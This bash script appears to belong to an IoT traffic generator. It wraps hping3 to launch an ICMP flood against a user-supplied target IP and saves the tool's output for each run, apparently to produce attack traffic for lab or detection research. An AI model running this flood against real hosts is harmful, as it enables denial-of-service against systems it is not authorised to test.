#!/usr/bin/env bash
set -euo pipefail

: "${TARGET_IP:?TARGET_IP is required}"

TOOL_ARGS="${TOOL_ARGS:-}"
RUN_ID="${RUN_ID:-run_unknown}"
OUT_DIR="${OUT_DIR:-runs/${RUN_ID}/icmp_flood}"

mkdir -p "$OUT_DIR"

echo "[icmp_flood] TARGET=${TARGET_IP}"
echo "[icmp_flood] TOOL_ARGS=${TOOL_ARGS}"
echo "[icmp_flood] OUT_DIR=${OUT_DIR}"

if ! command -v hping3 &>/dev/null; then
    echo "[icmp_flood] ERROR: hping3 not found in PATH"
    echo "[icmp_flood] Install: apt install hping3 or brew install hping3"
    exit 1
fi

if [[ "${EUID:-$(id -u)}" -ne 0 ]]; then
    echo "[icmp_flood] WARNING: hping3 requires root privileges"
    echo "[icmp_flood] Run with: sudo iottrafficgen ..."
fi

read -r -a ARGS <<< "$TOOL_ARGS"

OUTPUT_FILE="${OUT_DIR}/hping3_output.txt"

printf '[icmp_flood] CMD: hping3 %q --icmp' "$TARGET_IP"
for a in "${ARGS[@]}"; do printf ' %q' "$a"; done
printf ' > %q 2>&1\n' "$OUTPUT_FILE"

echo "[icmp_flood] Starting ICMP flood attack..."
echo "[icmp_flood] Press Ctrl+C to stop"

set +e
hping3 "$TARGET_IP" \
    --icmp \
    "${ARGS[@]}" \
    -V > "$OUTPUT_FILE" 2>&1 &

HPING_PID=$!
echo "[icmp_flood] hping3 PID: $HPING_PID"

wait $HPING_PID
EXIT_CODE=$?
set -e

echo "[icmp_flood] hping3 exit code: $EXIT_CODE"

if [[ -f "$OUTPUT_FILE" ]]; then
    echo "[icmp_flood] Output saved to: $OUTPUT_FILE"
    OUT_LINES=$(wc -l < "$OUTPUT_FILE" 2>/dev/null || echo "0")
    echo "[icmp_flood] Output lines: $OUT_LINES"
else
    echo "[icmp_flood] WARNING: No output file generated"
fi

echo "[icmp_flood] Completed"
exit $EXIT_CODE
